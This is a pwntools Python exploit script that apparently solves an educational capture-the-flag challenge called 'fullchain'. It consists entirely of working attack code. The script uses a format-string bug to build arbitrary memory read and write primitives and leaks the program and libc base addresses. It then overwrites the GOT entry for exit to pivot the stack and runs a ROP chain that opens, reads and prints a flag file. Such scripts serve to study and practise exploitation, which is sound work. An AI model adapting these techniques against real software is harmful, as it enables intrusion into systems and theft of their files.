from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
# context.log_level = "debug"

elf = ELF("./fullchain_bin_patched")
libc = ELF("./libc.so.6")
# io = gdb.debug("./fullchain_bin_patched", "b mprotect\nc", aslr=False)
io = remote("edu-ctf.zoolab.org", 30201)
# io = process("./fullchain_bin_patched")

io.sendlineafter(b"> ", b"local")
io.sendlineafter(b"> ", b"write%7$p")
io.recvuntil(b"write")
local_addr = int(io.recvuntil(b"global")[:-6], 16)
cnt_addr = local_addr - 12
print(f"{cnt_addr = :#x}")

io.sendlineafter(b" > ", b"local")
io.sendlineafter(b" > ", b"read")
io.send(b"a" * 16 + p64(cnt_addr))

io.sendlineafter(b" > ", b"local")
io.sendlineafter(b" > ", b"write%16$n")

# now: cnt == 5


def fmt(s: bytes):
    assert len(s) < 24
    io.sendlineafter(b" > ", b"global")
    io.sendlineafter(b" > ", b"read")
    io.sendline(s)
    io.sendlineafter(b" > ", b"global")
    io.sendlineafter(b" > ", b"write")
    return io.recvuntil(b"global or local")[:-15]


def read(addr: int):
    io.sendlineafter(b" > ", b"local")
    io.sendlineafter(b" > ", b"read")
    io.send(b"a" * 16 + p64(addr))
    return fmt(b"%16$s")


def write(addr: int, v: int):
    assert 0 <= v < 256
    io.sendlineafter(b" > ", b"local")
    io.sendlineafter(b" > ", b"read")
    io.send(b"a" * 16 + p64(addr))
    if v > 0:
        fmt(f"%{v}c%16$hhn".encode())
    else:
        fmt(b"%16$hhn")


def write_bytes(addr: int, b: bytes):
    for i, v in enumerate(b):
        print(i, v, hex(addr + i))
        write(addr + i, v)


write(cnt_addr, 255)
write(cnt_addr + 1, 255)

# pratically infinite read/write

# leak program base

io.sendlineafter(b" > ", b"local")
io.sendlineafter(b" > ", b"write%8$p")
io.recvuntil(b"write")
prog_base = int(io.recvuntil(b"global")[:-6], 16) - elf.sym["__libc_csu_init"]
print(f"{prog_base = :#x}")
elf.address = prog_base

# leak libc base

libc_base = int.from_bytes(read(elf.got["setvbuf"]), "little") - libc.sym["setvbuf"]
print(f"{libc_base = :#x}")
libc.address = libc_base

# generate rop chain

orwbuf = prog_base + 0x4350

write_bytes(orwbuf, b"/home/fullchain/flag\0")
print("write path done")

libcrop = ROP(libc)
pop_rdi = libcrop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = libcrop.find_gadget(["pop rsi", "ret"]).address
pop_rax_rdx_rbx = libcrop.find_gadget(["pop rax", "pop rdx", "pop rbx", "ret"]).address
syscall_ret = libcrop.find_gadget(["syscall", "ret"]).address


def syscall(rax, rdi, rsi, rdx):
    return [pop_rax_rdx_rbx, rax, rdx, 0, pop_rdi, rdi, pop_rsi, rsi, syscall_ret]


chain = []
chain += syscall(2, orwbuf, 0, 0)
chain += syscall(0, 3, orwbuf, 100)
chain += syscall(1, 1, orwbuf, 100)
payload = flat(chain)

# a weird stack pivoting

pop_r13_r14_r15_ret = prog_base + 0x185E
pop_rsp_ret = libc_base + 0x32B5A

print(f"{pop_r13_r14_r15_ret = :#x}")
print(f"{pop_rsp_ret = :#x}")


write_bytes(elf.got["exit"], p64(pop_r13_r14_r15_ret))
print("write exit done")

new_stack = prog_base + 0x4421
print(f"{new_stack = :#x}")
write_bytes(new_stack, payload)
print("write new stack done")

io.sendlineafter(b" > ", b"global")
io.sendlineafter(b" > ", b"read")
io.send(flat([pop_rdi, new_stack, elf.sym["myread"]]))

io.sendlineafter(b" > ", b"local")
io.sendlineafter(b" > ", b"read")
io.send(flat([0xDEADBEEF, new_stack, 0x87638763]))
io.sendafter(b" > ", p64(pop_rsp_ret)[:-1] + b"\n")  # same address as 0xDEADBEEF, trigger exit
io.sendline(b"rop" * 30)

io.interactive()
